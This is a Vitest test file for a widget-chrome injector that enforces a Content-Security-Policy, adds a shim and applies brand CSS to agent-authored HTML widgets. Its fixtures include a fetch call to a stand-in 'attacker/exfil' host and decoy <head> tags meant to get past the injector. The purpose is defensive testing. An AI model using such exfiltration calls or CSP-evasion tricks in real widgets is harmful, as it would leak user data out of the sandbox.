import {describe, expect, it} from 'vitest';

import {WIDGET_BRAND_CSS} from '../brandKit';
import {buildWidgetDocument, injectWidgetChrome} from '../widgetChrome';

const CSP = 'http-equiv="Content-Security-Policy"';
const SHIM_DEFINITION = 'window.McpApp = {';
const OUR_POLICY = "default-src 'none'";
const BRAND_MARKER = '--background-brand-purple-primary';

describe('injectWidgetChrome', () => {
  it('injects CSP and shim into a document that merely REFERENCES McpApp', () => {
    // Agent-authored widgets are told to call window.McpApp, never define it.
    // A reference must not be mistaken for the shim being present — that
    // mistake once shipped widgets with no CSP at all.
    const source =
      '<!doctype html><html><head><title>w</title></head>' +
      '<body><script>if (window.McpApp) { window.McpApp.connect(); }</script></body></html>';
    const out = injectWidgetChrome(source);
    expect(out).toContain(CSP);
    expect(out).toContain(SHIM_DEFINITION);
  });

  it('ignores the CSP marker text sitting inside an HTML comment', () => {
    // A naive substring test for the marker treats this comment as proof a
    // real CSP is already applied and skips injection — shipping the widget
    // with no lockdown at all. The marker must only match a real meta tag.
    const source =
      '<!doctype html><html><head><title>w</title>' +
      `<!-- ${CSP} already handled --></head><body></body></html>`;
    const out = injectWidgetChrome(source);
    const cspTags = out.match(/<meta[^>]*Content-Security-Policy[^>]*>/gi);
    expect(cspTags).toHaveLength(1);
    expect(out).toContain(OUR_POLICY);
    // The comment is untouched — only real meta tags are stripped.
    expect(out).toContain(`<!-- ${CSP} already handled -->`);
  });

  it('strips a permissive widget-supplied CSP and replaces it with our own', () => {
    const source =
      '<!doctype html><html><head><title>w</title>' +
      `<meta ${CSP} content="default-src *"></head><body></body></html>`;
    const out = injectWidgetChrome(source);
    expect(out).not.toContain('default-src *');
    expect(out).toContain(OUR_POLICY);
    const cspTags = out.match(/<meta[^>]*Content-Security-Policy[^>]*>/gi);
    expect(cspTags).toHaveLength(1);
  });

  it('replaces the CSP tag and adds the shim when only the shim is missing', () => {
    const cspOnly =
      `<!doctype html><html><head><meta ${CSP} content="default-src 'none'"></head>` +
      '<body></body></html>';
    const out = injectWidgetChrome(cspOnly);
    expect(out).toContain(SHIM_DEFINITION);
    expect(out.match(/Content-Security-Policy/g)).toHaveLength(1);
  });

  it('is not fooled by a decoy <head> hidden in an HTML comment', () => {
    // A widget whose only <head>-looking substring is inside a comment: an
    // injector that anchors on the first `<head>` match drops the CSP into the
    // comment, where the parser never applies it, and the widget's fetch runs
    // unrestricted. Our head must land before the comment, as real markup.
    const source =
      '<!doctype html>\n<!-- <head> -->\n' +
      "<html><body><script>fetch('http://attacker/exfil')</script></body></html>";
    const out = injectWidgetChrome(source);
    // Our chrome comes first, before the decoy comment.
    expect(out.indexOf(OUR_POLICY)).toBeLessThan(
      out.indexOf('<!-- <head> -->'),
    );
    // And the CSP is not buried inside the comment span.
    const commentBody = out.slice(out.indexOf('<!--'), out.indexOf('-->') + 3);
    expect(commentBody).not.toContain('Content-Security-Policy');
  });

  it('is not fooled by a decoy <head> inside an attribute value', () => {
    const source =
      '<!doctype html>\n<html data-x="<head>">' +
      "<body><script>fetch('http://attacker/exfil')</script></body></html>";
    const out = injectWidgetChrome(source);
    // Our head precedes the widget's <html>, so the CSP is not spliced into
    // the attribute value.
    expect(out.indexOf(OUR_POLICY)).toBeLessThan(out.indexOf('data-x='));
  });

  it('strips an unquoted widget CSP meta too', () => {
    const source =
      '<!doctype html><html><head>' +
      '<meta http-equiv=Content-Security-Policy content="default-src *">' +
      '</head><body></body></html>';
    const out = injectWidgetChrome(source);
    expect(out).not.toContain('default-src *');
    expect(out).toContain(OUR_POLICY);
  });

  it('wraps a bare fragment into a full chromed document', () => {
    const out = injectWidgetChrome('<p>fragment</p>');
    expect(out).toContain('<!doctype html>');
    expect(out).toContain(CSP);
    expect(out).toContain(SHIM_DEFINITION);
    expect(out).toContain('<p>fragment</p>');
  });

  it('is idempotent: re-running on its own output is a no-op', () => {
    // The CSP is now always stripped and reinjected (never merely trusted),
    // so a second pass must land on a fixed point rather than accumulating
    // more meta tags or shim scripts.
    const built = buildWidgetDocument({
      title: 'w',
      bodyHtml: '<p>hi</p>',
      css: '',
      js: '',
    });
    const once = injectWidgetChrome(built);
    const twice = injectWidgetChrome(once);
    expect(twice).toBe(once);
    expect(once.match(/Content-Security-Policy/g)).toHaveLength(1);
    expect(once.match(/window\.McpApp = \{/g)).toHaveLength(1);
  });
});

describe('brand kit injection', () => {
  it('buildWidgetDocument includes the brand style block ahead of the widget CSS', () => {
    const out = buildWidgetDocument({
      title: 'w',
      bodyHtml: '<p>hi</p>',
      css: '.custom { color: red; }',
      js: '',
    });
    expect(out).toContain(BRAND_MARKER);
    expect(out.indexOf(WIDGET_BRAND_CSS)).toBeGreaterThanOrEqual(0);
    // Brand style comes before the widget's own <style>, so a matching
    // selector in the widget's CSS still wins the cascade.
    expect(out.indexOf(BRAND_MARKER)).toBeLessThan(out.indexOf('.custom'));
  });

  it("a widget's own rule for a shared selector still overrides the brand kit", () => {
    const widgetCss = '.w-button--primary { background-color: #123456; }';
    const out = buildWidgetDocument({
      title: 'w',
      bodyHtml: '<button class="w-button w-button--primary">Go</button>',
      css: widgetCss,
      js: '',
    });
    // The brand kit defines .w-button--primary too (first occurrence); the
    // widget's override must come later in source order to win the cascade.
    expect(out.indexOf('.w-button--primary')).toBeGreaterThanOrEqual(0);
    expect(out.indexOf(widgetCss)).toBeGreaterThan(
      out.indexOf('.w-button--primary'),
    );
  });

  it('injectWidgetChrome adds the brand style block to a bare fragment', () => {
    const out = injectWidgetChrome('<p>fragment</p>');
    expect(out).toContain(BRAND_MARKER);
    expect(out.indexOf(BRAND_MARKER)).toBeLessThan(out.indexOf('fragment'));
  });

  it('injectWidgetChrome brand style survives repeated passes without duplicating', () => {
    const once = injectWidgetChrome('<p>fragment</p>');
    const twice = injectWidgetChrome(once);
    expect(twice).toBe(once);
    // One injected chrome head means one copy of the brand style block, no
    // matter how many passes ran.
    expect(twice.match(/data-cdo-widget-chrome/g)).toHaveLength(1);
  });
});
